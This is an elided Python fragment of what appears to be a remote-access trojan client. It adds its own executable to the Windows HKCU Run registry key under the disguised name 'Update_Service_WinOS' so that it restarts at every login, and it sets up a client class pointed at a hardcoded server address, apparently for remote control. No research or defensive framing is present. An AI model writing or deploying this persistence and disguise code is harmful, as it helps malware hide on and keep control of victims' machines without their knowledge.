...
currunt_executable_path = sys.executable

REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"

registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
winreg.SetValueEx(registry_key, "Update_Service_WinOS", 0, winreg.REG_SZ, currunt_executable_path)
...
class Client(object):
    def __init__(self):
        ...
        self.serverHost = "192.168.43.168"
